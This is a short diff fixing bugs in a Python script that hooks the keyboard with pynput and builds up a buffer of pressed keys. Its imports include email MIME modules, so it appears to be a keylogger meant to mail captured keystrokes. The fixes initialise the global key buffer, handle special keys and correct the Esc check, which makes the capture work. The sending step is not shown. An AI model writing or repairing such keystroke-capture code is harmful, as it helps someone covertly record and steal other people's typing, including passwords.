@@ -3,7 +3,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
 
-global keys_pressed
+keys_pressed = ""  # Initialize the global variable
 
 def on_press(key):
     global keys_pressed
@@ -14,8 +14,11 @@ def on_press(key):
         print(f"Special key {key} pressed")
 
 def on_release(key):
-    print(f"Key {key.char} released")
-    if key == keyboard.key.esc:
+    try:
+        print(f"Key {key.char} released")
+    except AttributeError:
+        print(f"Special key {key} released")
+    if key == keyboard.Key.esc:  # Correct capitalization
         return False
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
